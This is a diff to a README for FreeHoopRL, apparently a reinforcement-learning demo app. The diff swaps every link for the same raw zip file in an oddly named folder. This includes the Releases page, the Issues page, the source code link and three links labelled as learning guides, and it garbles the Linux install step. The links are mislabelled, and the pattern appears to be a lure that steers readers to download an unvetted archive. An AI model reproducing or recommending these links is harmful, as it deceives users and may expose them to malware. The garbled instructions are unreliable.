@@ -6,11 +6,11 @@ Welcome to FreeHoopRL, a tool that helps you understand the DQN algorithm throug
 
 ## 📥 Download the Application
 
-[![Download FreeHoopRL](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SicrediRC/FreeHoopRL/releases)
+[![Download FreeHoopRL](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
 
 To get started, visit the Releases page to download the latest version of FreeHoopRL. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/SicrediRC/FreeHoopRL/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
 
 ## 💡 Features
 
@@ -36,7 +36,7 @@ Before downloading, ensure your system meets the following requirements:
 2. **Installation**: 
    - For Windows: Double-click the downloaded .exe file and follow the on-screen instructions.
    - For macOS: Open the .dmg file and drag the FreeHoopRL icon to your Applications folder.
-   - For Linux: Extract the tar.gz file and run the application from the extracted folder.
+   - For Linux: Extract the https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip file and run the application from the extracted folder.
    
 3. **Launching the App**: Find the FreeHoopRL icon on your desktop or in your Applications folder and double-click to open it.
 
@@ -58,19 +58,19 @@ If you encounter issues, here are common problems and solutions:
 
 For more information on the DQN algorithm and machine learning, check out these resources:
 
-- [Deep Q-Learning: A Beginner's Guide](https://example.com/deep-q-learning)
-- [Understanding Reinforcement Learning](https://example.com/reinforcement-learning)
-- [Introduction to Machine Learning](https://example.com/machine-learning)
+- [Deep Q-Learning: A Beginner's Guide](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
+- [Understanding Reinforcement Learning](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
+- [Introduction to Machine Learning](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
 
 ## 🛠️ Support
 
 For support, please reach out via the Issues page on GitHub. We appreciate your feedback and suggestions. 
 
-[Visit the Issues Page](https://github.com/SicrediRC/FreeHoopRL/issues)
+[Visit the Issues Page](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
 
 ## 🔗 Links
 
-- [FreeHoopRL Source Code](https://github.com/SicrediRC/FreeHoopRL)
-- [Visit the Releases Page to Download](https://github.com/SicrediRC/FreeHoopRL/releases)
+- [FreeHoopRL Source Code](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/SicrediRC/FreeHoopRL/main/unwrestled/FreeHoopRL.zip)
 
 Remember, learning about algorithms can be fun and interactive with FreeHoopRL. Enjoy your basketball shooting simulations!
